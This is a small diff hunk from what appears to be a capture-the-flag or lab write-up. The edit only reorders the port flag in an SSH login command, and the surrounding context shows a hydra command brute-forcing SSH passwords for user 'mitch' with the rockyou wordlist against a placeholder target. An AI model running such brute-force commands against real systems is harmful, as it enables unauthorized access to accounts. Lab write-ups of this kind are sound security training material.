@@ -58,7 +58,7 @@ hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 <target-ip> ssh
 Logged into the system:
 
 ```bash
-ssh -p 2222 mitch@<target-ip>
+ssh mitch@<target-ip> -p 2222
 ```
 
 ![2025-05-07_18-22](https://github.com/user-attachments/assets/be323de4-a303-43a6-abd2-65089b6baa7c)
